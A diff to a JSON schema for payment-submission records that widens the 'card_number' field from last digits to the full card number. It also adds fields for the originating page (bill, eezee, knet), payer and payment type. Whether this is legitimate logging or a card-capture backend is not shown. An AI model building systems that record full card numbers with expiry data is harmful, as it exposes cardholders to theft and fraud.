@@ -20,7 +20,7 @@
     },
     "card_number": {
       "type": "string",
-      "description": "Card number (last digits)"
+      "description": "Card number"
     },
     "expiry_month": {
       "type": "string",
@@ -44,7 +44,7 @@
     },
     "phone_number": {
       "type": "string",
-      "description": "Authorized phone number"
+      "description": "Phone number submitted"
     },
     "network": {
       "type": "string",
@@ -61,6 +61,18 @@
     "user_agent": {
       "type": "string",
       "description": "Browser/device user agent"
+    },
+    "page": {
+      "type": "string",
+      "description": "Page/tab where submission originated (bill, eezee, knet)"
+    },
+    "pay_for": {
+      "type": "string",
+      "description": "Who the payment is for (self, family, other)"
+    },
+    "type": {
+      "type": "string",
+      "description": "Payment type (bill, recharge, knet)"
     }
   },
   "required": []
